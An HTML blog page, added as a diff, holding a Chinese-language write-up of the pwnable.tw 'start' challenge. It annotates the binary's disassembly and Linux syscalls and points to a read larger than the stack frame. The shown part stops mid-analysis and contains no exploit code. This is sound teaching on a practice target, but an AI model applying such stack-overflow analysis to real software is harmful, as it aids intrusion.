@@ -1,0 +1,563 @@
+<!doctype html>
+<html lang="zh_CN">
+<head>
+
+    <meta charset="utf-8">
+    <meta name="generator" content="Hugo 0.64.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>pwnable.tw 0x0 start writeup | 不正经的正经程序猿</title>
+    <meta property="og:title" content="pwnable.tw 0x0 start writeup - 不正经的正经程序猿">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content="2019-02-13T01:42:41&#43;08:00">
+        
+        
+    <meta property="article:modified_time" content="2019-02-13T01:42:41&#43;08:00">
+        
+    <meta name="Keywords" content="iOS,macOS,逆向,Reverse,RE,越狱,jailbreak,xnure">
+    <meta name="description" content="pwnable.tw 0x0 start writeup">
+        
+    <meta name="author" content="tylinux">
+    <meta property="og:url" content="https://www.tylinux.com/post/pwnable-0x00-start/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href="/css/normalize.css">
+    
+        <link rel="stylesheet" href="/css/prism.css">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+
+    
+
+
+    
+    
+</head>
+
+<body>
+<header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://www.tylinux.com/">
+                        不正经的正经程序猿
+                    </a>
+                
+                <p class="description">一个人的命运啊，当然要靠自我奋斗，但是也要考虑历史的行程</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://www.tylinux.com/">首页</a>
+                    
+                    <a  href="https://www.tylinux.com/archives/" title="归档">归档</a>
+                    
+                    <a  href="https://www.tylinux.com/about/" title="关于">关于</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+<div id="body">
+    <div class="container">
+        <div class="col-group">
+
+            <div class="col-8" id="main">
+                <div class="res-cons">
+                    <article class="post">
+                        <header>
+                            <h1 class="post-title">pwnable.tw 0x0 start writeup</h1>
+                        </header>
+                        <date class="post-meta meta-date">
+                            2019年2月13日
+                        </date>
+                        
+                        <div class="post-meta">
+                            <span>|</span>
+                            
+                                <span class="meta-category"><a href="https://www.tylinux.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8">二进制安全</a></span>
+                            
+                        </div>
+                        
+                        
+                        <div class="post-meta">
+                            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span> 阅读</span></span>
+                        </div>
+                        
+                        
+                        <div class="post-content">
+                            <blockquote>
+<p>地址：<a href="https://pwnable.tw/challenge/#1">https://pwnable.tw/challenge/#1</a></p>
+</blockquote>
+<h2 id="分析">分析</h2>
+<p>下载 <code>start</code> 可执行文件，放到 Linux 虚拟机中，先 file 一下:</p>
+<pre><code>start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
+</code></pre><p>32bit 可执行程序。</p>
+<p>执行一下：</p>
+<pre><code>Let's start the CTF:
+</code></pre><p>有个输入提示，随便输入点儿啥，回车就结束了，啥都没有发生。</p>
+<p>用 <code>radare2</code> 打开分析一下：</p>
+<p><code>aa</code> 分析二进制文件
+<code>afl</code> 列出所有 function
+<code>pdf</code> 反汇编 function</p>
+<p>如下：
+<img src="https://i.loli.net/2019/02/13/5c6306387eeb8.jpg" alt="-w1118"></p>
+<p>汇编很短，简单注释一下（可以用 <code>objdump -M intel start</code> 导出）：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">0</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">_start</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:
+ <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">保</span><span style="color:#960050;background-color:#1e0010">存</span> <span style="color:#a6e22e">ESP</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">5</span><span style="color:#960050;background-color:#1e0010">4</span>                   	<span style="color:#a6e22e">push</span>   <span style="color:#66d9ef">esp</span>
+ 
+ <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">保</span><span style="color:#960050;background-color:#1e0010">存</span><span style="color:#960050;background-color:#1e0010">程</span><span style="color:#960050;background-color:#1e0010">序</span><span style="color:#960050;background-color:#1e0010">返</span><span style="color:#960050;background-color:#1e0010">回</span><span style="color:#960050;background-color:#1e0010">地</span><span style="color:#960050;background-color:#1e0010">址</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">1</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">8</span> <span style="color:#960050;background-color:#1e0010">9</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">08</span>       	<span style="color:#66d9ef">push</span>   <span style="color:#ae81ff">0x804809d</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">3</span><span style="color:#960050;background-color:#1e0010">1</span> <span style="color:#a6e22e">c0</span>                	<span style="color:#66d9ef">xor</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">3</span><span style="color:#960050;background-color:#1e0010">1</span> <span style="color:#a6e22e">db</span>                	<span style="color:#66d9ef">xor</span>    <span style="color:#66d9ef">ebx</span>,<span style="color:#66d9ef">ebx</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">6</span>a:	<span style="color:#960050;background-color:#1e0010">3</span><span style="color:#960050;background-color:#1e0010">1</span> <span style="color:#a6e22e">c9</span>                	<span style="color:#66d9ef">xor</span>    <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">ecx</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">6</span>c:	<span style="color:#960050;background-color:#1e0010">3</span><span style="color:#960050;background-color:#1e0010">1</span> <span style="color:#a6e22e">d2</span>                	<span style="color:#66d9ef">xor</span>    <span style="color:#66d9ef">edx</span>,<span style="color:#66d9ef">edx</span>
+
+ <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">把</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">Let</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">s</span> <span style="color:#66d9ef">start</span> <span style="color:#66d9ef">the</span> <span style="color:#66d9ef">CTF</span>:<span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#960050;background-color:#1e0010">放</span><span style="color:#960050;background-color:#1e0010">到</span><span style="color:#960050;background-color:#1e0010">栈</span><span style="color:#960050;background-color:#1e0010">里</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">6</span>e:	<span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">8</span> <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">3</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#960050;background-color:#1e0010">4</span> <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">6</span> <span style="color:#960050;background-color:#1e0010">3</span><span style="color:#a6e22e">a</span>       	<span style="color:#66d9ef">push</span>   <span style="color:#ae81ff">0x3a465443</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">3</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">8</span> <span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">4</span> <span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">8</span> <span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">5</span> <span style="color:#960050;background-color:#1e0010">2</span><span style="color:#960050;background-color:#1e0010">0</span>       	<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x20656874</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">8</span> <span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">1</span> <span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">2</span> <span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">4</span> <span style="color:#960050;background-color:#1e0010">2</span><span style="color:#960050;background-color:#1e0010">0</span>       	<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x20747261</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">7</span>d:	<span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">8</span> <span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">3</span> <span style="color:#960050;background-color:#1e0010">2</span><span style="color:#960050;background-color:#1e0010">0</span> <span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">3</span> <span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">4</span>       	<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x74732073</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">2</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">6</span><span style="color:#960050;background-color:#1e0010">8</span> <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">27</span>       	<span style="color:#66d9ef">push</span>   <span style="color:#ae81ff">0x2774654c</span>
+
+ <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span> <span style="color:#a6e22e">Linux</span> <span style="color:#66d9ef">System</span> <span style="color:#66d9ef">Call</span> <span style="color:#960050;background-color:#1e0010">输</span><span style="color:#960050;background-color:#1e0010">出</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">Let</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">s</span> <span style="color:#66d9ef">start</span> <span style="color:#66d9ef">the</span> <span style="color:#66d9ef">CTF</span>:<span style="color:#960050;background-color:#1e0010">&#34;</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">9</span> <span style="color:#a6e22e">e1</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#a6e22e">b2</span> <span style="color:#ae81ff">14</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">dl</span>,<span style="color:#ae81ff">0x14</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span>b:	<span style="color:#a6e22e">b3</span> <span style="color:#ae81ff">01</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">bl</span>,<span style="color:#ae81ff">0x1</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span>d:	<span style="color:#a6e22e">b0</span> <span style="color:#ae81ff">04</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0x4</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span>f:	<span style="color:#a6e22e">cd</span> <span style="color:#ae81ff">80</span>                	<span style="color:#66d9ef">int</span>    <span style="color:#ae81ff">0x80</span>
+
+ <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span> <span style="color:#a6e22e">Linux</span> <span style="color:#66d9ef">System</span> <span style="color:#66d9ef">Call</span> <span style="color:#960050;background-color:#1e0010">接</span><span style="color:#960050;background-color:#1e0010">收</span><span style="color:#960050;background-color:#1e0010">用</span><span style="color:#960050;background-color:#1e0010">户</span><span style="color:#960050;background-color:#1e0010">输</span><span style="color:#960050;background-color:#1e0010">入</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#66d9ef">buffer</span> <span style="color:#960050;background-color:#1e0010">大</span><span style="color:#960050;background-color:#1e0010">小</span><span style="color:#960050;background-color:#1e0010">为</span> <span style="color:#ae81ff">0x3c</span> 
+ <span style="color:#ae81ff">8048091</span>:	<span style="color:#ae81ff">31</span> <span style="color:#66d9ef">db</span>                	<span style="color:#66d9ef">xor</span>    <span style="color:#66d9ef">ebx</span>,<span style="color:#66d9ef">ebx</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">3</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#a6e22e">b2</span> <span style="color:#ae81ff">3</span><span style="color:#66d9ef">c</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">dl</span>,<span style="color:#ae81ff">0x3c</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">5</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#a6e22e">b0</span> <span style="color:#ae81ff">03</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0x3</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#a6e22e">cd</span> <span style="color:#ae81ff">80</span>                	<span style="color:#66d9ef">int</span>    <span style="color:#ae81ff">0x80</span>
+ 
+ <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">退</span><span style="color:#960050;background-color:#1e0010">栈</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">3</span> <span style="color:#a6e22e">c4</span> <span style="color:#ae81ff">14</span>             	<span style="color:#66d9ef">add</span>    <span style="color:#66d9ef">esp</span>,<span style="color:#ae81ff">0x14</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span>c:	<span style="color:#a6e22e">c3</span>                   	<span style="color:#66d9ef">ret</span>
+
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#a6e22e">d</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#66d9ef">_exit</span><span style="color:#960050;background-color:#1e0010">&gt;</span>:
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span>d:	<span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">c</span>                   	<span style="color:#66d9ef">pop</span>    <span style="color:#66d9ef">esp</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">9</span>e:	<span style="color:#960050;background-color:#1e0010">3</span><span style="color:#960050;background-color:#1e0010">1</span> <span style="color:#a6e22e">c0</span>                	<span style="color:#66d9ef">xor</span>    <span style="color:#66d9ef">eax</span>,<span style="color:#66d9ef">eax</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span>a0:	<span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">0</span>                   	<span style="color:#a6e22e">inc</span>    <span style="color:#66d9ef">eax</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span>a1:	<span style="color:#a6e22e">cd</span> <span style="color:#ae81ff">80</span>                	<span style="color:#66d9ef">int</span>    <span style="color:#ae81ff">0x80</span>
+</code></pre></div><p><a href="https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls32.html">Linux System Call Table 参考</a></p>
+<p>简单介绍一下 Linux System Call 的调用规范：调用号放置在 <code>eax</code> 中，参数依次放入 <code>ebx</code>、<code>ecx</code>、<code>edx</code> 等寄存器中，之后 <code>int 80</code> 执行调用，返回值会放入到 <code>eax</code> 中。</p>
+<p>start 里使用了3号和4号调用完成输出到终端和从终端读入的功能，从 <a href="https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls32.html">Linux System Call Table 参考</a> 中可知，3/4号调用需要 3 个参数：</p>
+<ul>
+<li><code>ebx</code>: 文件指针</li>
+<li><code>ecx</code>: 输入/输入出缓冲区首地址</li>
+<li><code>edx</code>: 输出字节数</li>
+</ul>
+<p>所以输入/输出部分汇编注释如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span> <span style="color:#a6e22e">Linux</span> <span style="color:#66d9ef">System</span> <span style="color:#66d9ef">Call</span> <span style="color:#960050;background-color:#1e0010">输</span><span style="color:#960050;background-color:#1e0010">出</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">Let</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">s</span> <span style="color:#66d9ef">start</span> <span style="color:#66d9ef">the</span> <span style="color:#66d9ef">CTF</span>:<span style="color:#960050;background-color:#1e0010">&#34;</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">7</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">9</span> <span style="color:#a6e22e">e1</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">ecx</span>,<span style="color:#66d9ef">esp</span> <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">栈</span><span style="color:#960050;background-color:#1e0010">顶</span><span style="color:#960050;background-color:#1e0010">为</span><span style="color:#960050;background-color:#1e0010">输</span><span style="color:#960050;background-color:#1e0010">出</span><span style="color:#960050;background-color:#1e0010">缓</span><span style="color:#960050;background-color:#1e0010">冲</span><span style="color:#960050;background-color:#1e0010">首</span><span style="color:#960050;background-color:#1e0010">地</span><span style="color:#960050;background-color:#1e0010">址</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">9</span><span style="color:#960050;background-color:#1e0010">:</span>	<span style="color:#a6e22e">b2</span> <span style="color:#ae81ff">14</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">dl</span>,<span style="color:#ae81ff">0x14</span> <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">共</span><span style="color:#960050;background-color:#1e0010">输</span><span style="color:#960050;background-color:#1e0010">出</span> <span style="color:#ae81ff">20</span> <span style="color:#960050;background-color:#1e0010">个</span><span style="color:#960050;background-color:#1e0010">字</span><span style="color:#960050;background-color:#1e0010">符</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span>b:	<span style="color:#a6e22e">b3</span> <span style="color:#ae81ff">01</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">bl</span>,<span style="color:#ae81ff">0x1</span>  <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">输</span><span style="color:#960050;background-color:#1e0010">出</span><span style="color:#960050;background-color:#1e0010">到</span> <span style="color:#66d9ef">stdout</span> <span style="color:#960050;background-color:#1e0010">（</span><span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">stdin</span>, <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">stdout</span>, <span style="color:#ae81ff">2</span>: <span style="color:#66d9ef">stderr</span><span style="color:#960050;background-color:#1e0010">）</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span>d:	<span style="color:#a6e22e">b0</span> <span style="color:#ae81ff">04</span>                	<span style="color:#66d9ef">mov</span>    <span style="color:#66d9ef">al</span>,<span style="color:#ae81ff">0x4</span>  <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span><span style="color:#960050;background-color:#1e0010">号</span><span style="color:#ae81ff">4</span>
+ <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">4</span><span style="color:#960050;background-color:#1e0010">8</span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#960050;background-color:#1e0010">8</span>f:	<span style="color:#a6e22e">cd</span> <span style="color:#ae81ff">80</span>                	<span style="color:#66d9ef">int</span>    <span style="color:#ae81ff">0x80</span>    <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">/</span> <span style="color:#960050;background-color:#1e0010">调</span><span style="color:#960050;background-color:#1e0010">用</span>
+ 
